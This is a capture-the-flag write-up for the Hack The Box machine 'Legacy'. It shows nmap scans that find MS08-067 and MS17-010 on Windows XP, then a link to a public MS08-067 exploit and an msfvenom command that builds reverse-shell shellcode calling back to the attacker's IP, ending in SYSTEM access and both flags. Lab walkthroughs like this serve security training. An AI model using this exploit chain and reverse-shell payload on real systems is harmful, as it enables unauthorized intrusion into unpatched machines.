# Legacy
>Author : Xyan1d3
>Date : 23nd June 2021
>IP : 10.10.10.4
>OS : Windows
>Difficulty : Easy

# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Wed Jun 23 02:06:02 2021 as: nmap -sC -sV -oN nmap/legacy -v 10.10.10.4
Nmap scan report for legacy.htb (10.10.10.4)
Host is up (0.080s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -4h29m47s, deviation: 2h07m16s, median: -5h59m47s
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:6e:23 (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   LEGACY<20>           Flags: <unique><active>
|   HTB<1e>              Flags: <group><active>
|   HTB<1d>              Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-06-22T20:36:29+03:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

The host is running Windows XP as confirmed by the Nmap scripts.
As, The OS is obsolete by now and is ancient. We will be turning towards some SMB exploits.

We run a the `nmap` script called vuln. Which scan's some of the common vulnerability.
```python
# Nmap 7.91 scan initiated Wed Jun 23 14:08:40 2021 as: nmap -sC -sV --script vuln -v -oN nmap/legacy 10.10.10.4
Nmap scan report for legacy.htb (10.10.10.4)
Host is up (0.080s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Microsoft Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```

From this script scan we find out that the machine is vulnerable to `MS08-067` and `MS17-010`.

# Exploiting MS08-067
Exploit Link : https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py

We have to change the buffer overflow shellcode by using the command by specified inside the exploit.

```python
┌─[Magisk@Xyan1d3]─[10.10.14.15]─[~/htb/legacy]
└──╼ # msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=8888 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows           
Found 11 compatible encoders              
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00) 
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348                          
Payload size: 348 bytes
Final size of c file: 1488 bytes
unsigned char buf[] = 
"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"                   

*** SNIP ***
```

We need to take the shellcode and replace it in the `MS08-067` exploit shellcode section.

![[Pasted image 20210623154227.png]]
![[Pasted image 20210623153919.png]]

We run the exploit and get a shell on the box as `NT Authority/SYSTEM` on the box.
But, We cannot verify it as Windows XP does not has `whoami.exe` inside. We could copy the `whoami.exe` from our box to the attackbox using the python SMBServer.

![[Pasted image 20210623154651.png]]

## User Flag
We can now get our `user.txt` by navigating `C:\Documents and Settings\john\Desktop` directory.
![[Pasted image 20210623154754.png]]

## Root Flag
We can now get our `root.txt` by navigating `C:\Documents and Settings\Administrator\Desktop` directory.
![[Pasted image 20210623154943.png]]